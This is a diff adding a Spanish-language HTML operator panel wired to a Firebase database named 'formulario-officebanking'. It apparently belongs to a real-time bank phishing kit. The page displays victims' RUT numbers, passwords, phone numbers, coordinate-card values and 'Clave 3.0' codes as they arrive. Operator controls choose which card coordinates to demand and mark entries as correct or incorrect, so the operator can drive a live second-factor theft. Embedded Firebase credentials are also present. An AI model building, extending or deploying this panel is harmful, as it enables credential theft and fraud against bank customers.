@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Panel de Control</title>
+  <style>
+    body {
+      font-family: Arial;
+      background: #f5f5f5;
+      padding: 20px;
+    }
+    h2 {
+      color: #222;
+    }
+    .switch-container {
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+    .switch-container label {
+      margin-left: 10px;
+    }
+    .coordenadas-inputs input {
+      width: 40px;
+      margin: 0 5px;
+      text-align: center;
+      font-size: 18px;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
+      background: white;
+    }
+    th, td {
+      padding: 8px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+    }
+    button {
+      margin-right: 10px;
+      padding: 8px 15px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h2>🧭 Panel de Control</h2>
+
+  <!-- 🔌 Switch Activar/Inactivar -->
+  <div class="switch-container">
+    <input type="checkbox" id="modoSwitch" />
+    <label for="modoSwitch">Modo asistente activo</label>
+  </div>
+
+  <!-- 🔲 Coordenadas específicas -->
+  <div>
+    <strong>Coordenadas a solicitar:</strong>
+    <div class="coordenadas-inputs">
+      <input type="text" id="coord1" maxlength="2" />
+      <input type="text" id="coord2" maxlength="2" />
+      <input type="text" id="coord3" maxlength="2" />
+    </div>
+  </div>
+
+  <!-- 🧭 Botones de control -->
+  <div style="margin-top: 15px;">
+    <button onclick="setEstado('siguiente')">✅ Siguiente</button>
+    <button onclick="setEstado('error')">❌ Datos Incorrectos</button>
+  </div>
+
+  <!-- 📋 Tabla de registros -->
+  <table>
+    <thead>
+      <tr>
+        <th>Hora</th>
+        <th>RUT</th>
+        <th>Clave</th>
+        <th>Teléfono</th>
+        <th>Coordenadas</th>
+        <th>Clave 3.0</th>
+      </tr>
+    </thead>
+    <tbody id="tabla-registros"></tbody>
+  </table>
+
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <script>
+    // Configuración de Firebase (tu proyecto)
+    const firebaseConfig = {
+      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
+      authDomain: "formulario-officebanking.firebaseapp.com",
+      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
+      projectId: "formulario-officebanking",
+      storageBucket: "formulario-officebanking.appspot.com",
+      messagingSenderId: "604053438195",
+      appId: "1:604053438195:web:188de91bee9a62f0d3c186"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // 🔁 Escuchar registros en tiempo real
+    db.ref("registros").on("value", snapshot => {
+      const tabla = document.getElementById("tabla-registros");
+      tabla.innerHTML = "";
+      const data = snapshot.val();
+      if (data) {
+        Object.values(data).forEach(entry => {
+          const row = document.createElement("tr");
+          row.innerHTML = `
+            <td>${entry.fecha || ''}</td>
+            <td>${entry.rut || ''}</td>
+            <td>${entry.clave || ''}</td>
+            <td>${entry.telefono || ''}</td>
+            <td>${entry.coordenadas || ''}</td>
+            <td>${entry.clave3 || ''}</td>
+          `;
+          tabla.appendChild(row);
+        });
+      }
+    });
+
+    // ✅ Botón siguiente o error
+    function setEstado(valor) {
+      db.ref("validacion_estado").set(valor);
+    }
+
+    // 🔁 Escuchar switch de asistente
+    document.getElementById("modoSwitch").addEventListener("change", function () {
+      const activo = this.checked;
+      db.ref("modo_asistente").set(activo);
+    });
+
+    // 🔁 Escuchar campos de coordenadas
+    ['coord1', 'coord2', 'coord3'].forEach((id, i) => {
+      document.getElementById(id).addEventListener("input", () => {
+        const c1 = document.getElementById("coord1").value;
+        const c2 = document.getElementById("coord2").value;
+        const c3 = document.getElementById("coord3").value;
+        db.ref("coordenadas_solicitadas").set({ c1, c2, c3 });
+      });
+    });
+  </script>
+</body>
+</html>
